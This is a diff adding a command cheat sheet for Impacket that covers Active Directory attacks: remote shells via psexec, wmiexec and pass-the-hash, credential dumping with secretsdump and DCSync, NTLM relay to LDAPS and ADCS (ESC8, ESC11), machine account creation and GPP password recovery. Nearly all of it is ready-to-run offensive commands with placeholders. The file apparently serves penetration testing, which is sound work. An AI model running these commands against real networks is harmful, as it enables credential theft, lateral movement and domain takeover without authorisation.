@@ -1,0 +1,110 @@
+% impacket, ad
+
+; --- remote exec / shells ---
+# Interactive SMB client
+impacket-smbclient <domain>/<user>:<pass>@<ip>
+
+# psexec: SYSTEM shell via service binary (noisy)
+impacket-psexec <domain>/<user>:<pass>@<ip>
+
+# smbexec: SMB-only, no service binary (quieter)
+impacket-smbexec <domain>/<user>:<pass>@<ip>
+
+# wmiexec: over DCOM/WMI, no SMB tickets in evt log
+impacket-wmiexec <domain>/<user>:<pass>@<ip>
+
+# atexec: one-off command via scheduled task
+impacket-atexec <domain>/<user>:<pass>@<ip> 'whoami /priv'
+
+# dcomexec: DCOM (MMC20 / ShellWindows)
+impacket-dcomexec <domain>/<user>:<pass>@<ip>
+
+# wmiexec via pass-the-hash
+impacket-wmiexec -hashes :<nthash> <domain>/<user>@<ip>
+
+# wmiexec via AES key
+impacket-wmiexec -aesKey <aeskey> <domain>/<user>@<ip>
+
+# wmiexec via kerberos (set KRB5CCNAME first)
+impacket-wmiexec -k -no-pass -dc-ip <ip> <domain>/<user>@dc.<domain>
+
+; --- credential / hive dump ---
+# secretsdump: local SAM + LSA secrets
+impacket-secretsdump <domain>/<user>:<pass>@<ip>
+
+# secretsdump via NT hash
+impacket-secretsdump -hashes :<nthash> <domain>/<user>@<ip>
+
+# DCSync: pull NTDS via DRSUAPI
+impacket-secretsdump -just-dc <domain>/<user>:<pass>@<ip>
+
+# DCSync, NTLM only (faster)
+impacket-secretsdump -just-dc-ntlm <domain>/<user>:<pass>@<ip>
+
+# DCSync a single user
+impacket-secretsdump -just-dc-user <target> <domain>/<user>:<pass>@<ip>
+
+# secretsdump offline from stolen hives (SAM)
+impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY LOCAL
+
+# secretsdump offline NTDS.dit + SYSTEM
+impacket-secretsdump -system SYSTEM -ntds NTDS.dit LOCAL
+
+# samrdump: SAMR enum
+impacket-samrdump <domain>/<user>:<pass>@<ip>
+
+# lookupsid: SID brute (null/guest if permitted)
+impacket-lookupsid <domain>/'':@<ip> 10000
+
+# rpcdump: list MSRPC interfaces
+impacket-rpcdump <ip>
+
+# ldapdomaindump: LDAP AD dump (HTML/JSON)
+impacket-ldapdomaindump -u <user> -p <pass> -d <domain> <ip>
+
+; --- NTLM relay (ntlmrelayx) ---
+# SMB -> SMB lateral cred-replay
+impacket-ntlmrelayx -smb2support -tf targets.txt
+
+# SMB -> LDAPS: write RBCD via attacker computer
+impacket-ntlmrelayx -t ldaps://dc.<domain> -smb2support --delegate-access --escalate-user '<host>$'
+
+# SMB -> HTTP
+impacket-ntlmrelayx -t http://<victim>/path -smb2support
+
+# SOCKS mode (interactive auth via proxychains)
+impacket-ntlmrelayx -tf targets.txt -smb2support -socks
+
+# Dump-only (capture the hash, no relay)
+impacket-ntlmrelayx -t smb://<ip> -smb2support --no-smb-server
+
+# ESC8: ADCS web enrollment relay -> cert -> TGT
+impacket-ntlmrelayx -t http://<ca_host>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
+
+# ESC11: ADCS over RPC
+impacket-ntlmrelayx -t rpc://<ca_host> --rpc-auth-level 6 --adcs -smb2support
+
+; --- misc account / GPP / MSSQL ---
+# addcomputer via SAMR (default MAQ=10)
+impacket-addcomputer -computer-name '<host>$' -computer-pass 'ComputerPass1!' -dc-host dc.<domain> <domain>/<user>:<pass>
+
+# addcomputer via LDAPS (hardened DCs)
+impacket-addcomputer -method LDAPS -computer-name '<host>$' -computer-pass 'ComputerPass1!' -dc-host dc.<domain> <domain>/<user>:<pass>
+
+# changepasswd: admin resets a target user
+impacket-changepasswd <domain>/<user>:<pass>@<ip> -newpass 'NewPass1!' -altuser <target>
+
+# Get-GPPPassword: recover cpassword from SYSVOL GPP
+impacket-Get-GPPPassword -domain <domain> -username <user> -password <pass> <ip>
+
+# findDelegation: list constrained/unconstrained/RBCD
+impacket-findDelegation -dc-ip <ip> <domain>/<user>:<pass>
+
+# mssqlclient: interactive MSSQL (windows auth)
+impacket-mssqlclient <domain>/<user>:<pass>@<ip> -windows-auth
+
+# mssqlclient via NT hash
+impacket-mssqlclient -hashes :<nthash> <domain>/<user>@<ip> -windows-auth
+
+# mssqlclient via SQL auth (local SQL account)
+impacket-mssqlclient <sql_user>:<sql_pass>@<ip>
